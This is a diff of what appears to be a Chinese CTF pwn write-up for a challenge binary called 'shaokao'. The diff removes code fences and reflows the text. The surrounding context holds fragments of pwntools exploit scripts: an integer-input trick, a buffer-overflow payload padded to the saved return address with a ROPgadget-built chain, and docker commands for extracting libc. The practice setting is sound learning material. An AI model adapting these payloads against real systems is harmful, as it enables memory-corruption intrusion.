@@ -63,7 +63,8 @@ BUUOJ：https://buuoj.cn/
 
 实践经验
 
-Q1:理论与现实的差距在哪？
+Q1:
+理论与现实的差距在哪？
 
 往期精选
 
@@ -91,17 +92,7 @@ RUN useradd -m ctf
 
 WORKDIR /home/ctf
 # 以下省略
-```
-
-
-
-```
 docker cp imageid:/lib32/libc.so.6 本地路径
-```
-
-
-
-```
 from pwn import *
 from struct import pack
 p=process("./shaokao")
@@ -115,22 +106,12 @@ p.recvuntil("n")
 p.sendline("-999998")
 
 p.interactive()
-```
-
-
-
-```
 ROPgadget --binary shaokao --ropchain
-```
-
-
-
-```
 from pwn import *
 from struct import pack
 p=process("./shaokao")
-#gdb.attach(p,"b*0x401FAE")
-#pause()
+    #gdb.attach(p,"b*0x401FAE")
+    #pause()
 p.recvuntil("0. ")
 p.sendline(str(1))
 p.recvuntil("3. ")
@@ -228,11 +209,6 @@ payload=b"a"*32+b"b"*8+rop()
 p.sendline(payload)
 
 p.interactive()
-```
-
-
-
-```
 from pwn import * 
 context.log_level='debug' 
 context.arch='amd64' 
@@ -246,11 +222,6 @@ sl = lambda a: p.sendline(a) 
 s = lambda a: p.send(a) 
 
 p.interactive()
-```
-
-
-
-```
 .text
 .global _funcA, _sum
 
